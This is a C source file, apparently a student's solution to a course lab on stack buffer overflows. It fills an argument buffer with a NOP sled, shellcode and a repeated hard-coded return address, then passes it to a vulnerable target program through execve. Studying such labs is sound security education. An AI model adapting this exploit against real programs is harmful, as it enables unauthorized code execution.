#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
#define TARGET "~/PA1/targets/target"

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;

  // Creating an input buffer that can cause buffer overflow in strcpy function in the target executable
  int buffSize = 1000; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   for (i=0; i < buffSize; i++) 	buff[i] = 0x01;
  buff[buffSize-1]=0;  //NULL terminate byte.

  // write your code below to fill the xx bytes shellcode into the buff variable and 
  // overwrite the return address correctly in order to achieve stack overflow
  // Your own code starts here:
  int offset = 182;  // Number of bytes from the start of localArray to the saved return address.
  int shellcodeSize = sizeof(shellcode) - 1;
  
  // Place the shellcode roughly in the middle of the first offset bytes.
  int shellcodePosition = (offset / 2) - (shellcodeSize / 2);

  // Fill the first part of the buffer with NOP instructions (0x90).
  memset(buff, 0x90, offset);

  // Insert the shellcode into the buffer at the calculated position.
  memcpy(buff + shellcodePosition, shellcode, shellcodeSize);

  // Overwrite the remaining bytes (starting at offset) with the return address.
  unsigned int retAddress = 0xffffd930;
  for (i = offset; i < buffSize - 1; i += 4)
      *((unsigned int *)(buff + i)) = retAddress;

  // Null-terminate the buffer.
  buff[buffSize - 1] = '\0';
   
  // Your code ends here.

  // prepare command line input to execute target code
  args[0] = TARGET; 
  args[1] = buff; // the first input parameter to the target code
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
   return 0;
}
